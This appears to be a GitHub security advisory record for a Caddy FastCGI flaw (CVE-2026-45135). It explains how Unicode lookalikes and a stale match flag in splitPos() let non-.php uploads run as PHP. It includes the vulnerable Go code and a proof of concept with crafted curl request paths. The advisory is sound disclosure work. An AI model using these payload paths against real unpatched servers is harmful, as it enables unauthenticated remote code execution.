@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-m675-2p33-xv9g",
+  "modified": "2026-05-18T13:46:17.750256Z",
+  "published": "2026-05-18T13:40:58Z",
+  "aliases": [
+    "CVE-2026-45135"
+  ],
+  "summary": "Caddy: Unsafe Unicode Handling in FastCGI splitPos Allows Execution of Non-PHP Files",
+  "details": "### Summary\n\nThe FastCGI transport's `splitPos()` in [`modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go`](https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go) misuses `golang.org/x/text/search` with `search.IgnoreCase` when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead Caddy's FastCGI splitting into treating a non-`.php` (or other configured `split_path` extension) file as a script. In any deployment where the attacker can place content into a file served via FastCGI (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw.\n\nThis function was adapted from FrankenPHP's code (see [the source comment](https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go#L429)) and inherits the same bugs. Both were originally reported against FrankenPHP by @KC1zs4 as [GHSA-3g8v-8r37-cgjm](https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm) (which absorbed the duplicate GHSA-v4h7-cj44-8fc8). Credit for finding the underlying flaws belongs to @KC1zs4.\n\n### Details\n\n```go\nvar splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)\n\nfunc (t Transport) splitPos(path string) int {\n\tif len(t.SplitPath) == 0 {\n\t\treturn 0\n\t}\n\tpathLen := len(path)\n\tfor _, split := range t.SplitPath {\n\t\tsplitLen := len(split)\n\t\tfor i := range pathLen {\n\t\t\tif path[i] \u003e= utf8.RuneSelf {\n\t\t\t\tif _, end := splitSearchNonASCII.IndexString(path, split); end \u003e -1 {\n\t\t\t\t\treturn end\n\t\t\t\t}\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif i+splitLen \u003e pathLen {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\tmatch := true\n\t\t\tfor j := range splitLen {\n\t\t\t\tc := path[i+j]\n\t\t\t\tif c \u003e= utf8.RuneSelf {\n\t\t\t\t\tif _, end := splitSearchNonASCII.IndexString(path, split); end \u003e -1 {\n\t\t\t\t\t\treturn end\n\t\t\t\t\t}\n\t\t\t\t\tbreak // \u003c-- flaw 1: 'match' is still true\n\t\t\t\t}\n\t\t\t\tif 'A' \u003c= c \u0026\u0026 c \u003c= 'Z' {\n\t\t\t\t\tc += 'a' - 'A'\n\t\t\t\t}\n\t\t\t\tif c != split[j] {\n\t\t\t\t\tmatch = false\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t}\n\t\t\tif match {\n\t\t\t\treturn i + splitLen\n\t\t\t}\n\t\t}\n\t}\n\treturn -1\n}\n```\n\n#### Flaw 1 — Control-flow: stale `match` after inner non-ASCII fallback\n\nIn the inner `for j` loop, when a byte satisfies `c \u003e= utf8.RuneSelf` and `splitSearchNonASCII.IndexString(...)` returns `-1`, the loop `break`s without setting `match = false`. The outer code then evaluates `if match { return i + splitLen }` with `match` still `true`, returning a position as if the configured extension had been matched. The script-name suffix actually present at that offset is whatever bytes the attacker chose, so a file named `name.\u003cU+00A1\u003e.txt` gets routed as PHP.\n\n#### Flaw 2 — Unicode equivalence: `search.IgnoreCase` folds non-ASCII lookalikes onto ASCII\n\n`search.New(language.Und, search.IgnoreCase)` performs Unicode equivalence matching (compatibility decomposition + case folding), which goes far beyond the ASCII-only case folding the surrounding code is built for. Many code points fold onto ASCII `.`, `p`, `h`, `p`, so a path containing `﹒php`, `．php`, `.ｐhp`, `.ⓟⓗⓟ`, `.𝗽𝗵𝗽`, `.𝓅𝒽𝓅`, `.𝖕𝖍𝖕`, etc. is reported as `.php`.\n\nBoth flaws share the same root cause: invoking `search.IgnoreCase` to match an ASCII-only, validated-lower-case `SplitPath` entry against an arbitrary path. `Provision()` already guarantees every entry is ASCII and lower-cased, so any byte `\u003e= utf8.RuneSelf` in the path can never be part of a legitimate match — but the fallback ignored that guarantee.\n\n### PoC\n\nRun against a Caddy build serving FastCGI to PHP-FPM (or any FastCGI app where script lookup is gated by `split_path`). Caddyfile:\n\n```text\n:8080 {\n    root * /app/public\n    php_fastcgi unix//run/php/php-fpm.sock\n}\n```\n\nPlace attacker-controlled files in `/app/public`:\n\n- `/app/public/poc-match-unset.\\xc2\\xa1.` — `\u003c?php echo \"marker=flaw1\\n\";`\n- `/app/public/poc-search-norm.𝗽𝗵𝗽` — `\u003c?php echo \"marker=flaw2\\n\";`\n\nTrigger:\n\n```bash\n# baseline (correctly NOT routed to PHP)\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-match-unset.txt/trigger\"\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-search-norm/trigger\"\n\n# flaw 1 — the .¡.txt file ends up as SCRIPT_FILENAME\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-match-unset.%C2%A1.txt/trigger\"\n\n# flaw 2 — the .𝗽𝗵𝗽 file ends up as SCRIPT_FILENAME\ncurl -i --path-as-is \"http://127.0.0.1:8080/poc-search-norm.%F0%9D%97%BD%F0%9D%97%B5%F0%9D%97%BD.anything-after-payload.php/trigger\"\n```\n\nBoth crafted requests respond with the marker payload from the non-`.php` file, confirming arbitrary code execution through the body of attacker-controlled files.\n\nA standalone reproducer of `splitPos()` in isolation (no Caddy build needed) is included in [GHSA-3g8v-8r37-cgjm](https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm); the function in this module is the same logic, so the same payloads apply.\n\n### Impact\n\nComparable to the previous FastCGI `split_path` issue ([GHSA-g966-83w7-6w38 / CVE-2026-24895](https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38)) but with a stricter precondition: the attacker needs the ability to place content into a file whose name matches one of the bypass patterns (the Unicode lookalike forms or a name containing a non-ASCII byte after a `.`). Where that precondition holds — common in upload endpoints, user-content stores, package mirrors — the bypass yields RCE in the FastCGI upstream via a single crafted URL, without authentication, over the network.\n\nCVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — High (8.1).\n\n### Patch\n\nDrop the `golang.org/x/text/search` fallback entirely and treat any byte `\u003e= utf8.RuneSelf` in the path as a non-match. `SplitPath` entries are validated ASCII-only and lower-cased upstream, so this preserves correct behavior for every legitimate path while making the Unicode bypasses unrepresentable. The replacement is a tight byte loop with no library calls in the hot path. See `fix/fastcgi-splitpos-unicode-bypass` (commit `4ddad83c`) for the implementation and regression tests.\n\n### Credit\n\nBoth flaws were originally found and reported by @KC1zs4 against FrankenPHP, where the offending `splitPos()` function was first introduced before being adapted into this module. The Caddy maintainers thank @KC1zs4 for the high-quality reports.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/caddyserver/caddy/v2",
+        "purl": "pkg:golang/github.com/caddyserver/caddy/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.7.0"
+            },
+            {
+              "fixed": "2.11.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.10.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m675-2p33-xv9g/GHSA-m675-2p33-xv9g.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/caddyserver/caddy"
+    }
+  ]
+}
